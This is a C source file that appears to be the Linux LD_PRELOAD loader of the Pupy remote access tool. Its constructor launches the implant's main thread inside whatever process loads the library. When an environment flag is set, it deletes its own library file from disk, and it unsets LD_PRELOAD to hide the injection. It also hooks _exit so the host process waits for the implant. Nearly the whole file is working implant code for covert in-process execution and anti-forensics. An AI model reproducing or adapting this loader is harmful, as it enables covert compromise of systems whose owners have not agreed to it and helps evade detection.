#define _GNU_SOURCE
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>
#include <string.h>

#include <dlfcn.h>

#include "pupy_load.h"
#include "debug.h"

static pthread_t thread_id;

static int __argc = 0;
static char ** __argv = NULL;

static void *
thread_start(void *arg)
{
    return (void *) mainThread(__argc, __argv, true);
}

static
void unloader(void) {
    dprint("Wait until pupy thread exits\n");
    pthread_join(thread_id, NULL);
    dprint("Sutting down\n");
}

void _exit(int status) {
    dprint("Catch exit");
    __attribute__((noreturn))
    void (*orig_exit)(int status) = dlsym(RTLD_NEXT, "_exit");
    if (!strcmp(getenv("HOOK_EXIT"), "1")) {
        dprint("Hook exit");
        unloader();
    }
    orig_exit(status);
}

static void _fill_argv(int argc, char* argv[], char* envp[]) {
    dprint("fill_argv called: %d/%p/%p\n", argc, argv, envp);
#ifdef DEBUG
    int i;
    for (i=0; i<argc; i++) {
        dprint("ARGV[%d] = %s\n", i, argv[i]);
    }
#endif

    __argc = argc;
    __argv = argv;
}

__attribute__((section(".init_array"))) void (* pfill_argv)(int, char*[], char*[]) = _fill_argv;

__attribute__((constructor))
void loader() {
    pthread_attr_t attr;
    pthread_attr_init(&attr);

    const char *ldpreload = getenv("LD_PRELOAD");
    const char *cleanup = getenv("CLEANUP");

    if (cleanup && ldpreload && !strcmp(cleanup, "1")) {
        dprint("Cleanup requested. Cleanup %s\n", ldpreload);
        unlink(ldpreload);
    }

    dprint("Unset LD_PRELOAD\n");
    unsetenv("LD_PRELOAD");

    dprint("Start thread\n");
    pthread_create(
        &thread_id, &attr,
        thread_start, NULL
    );
}
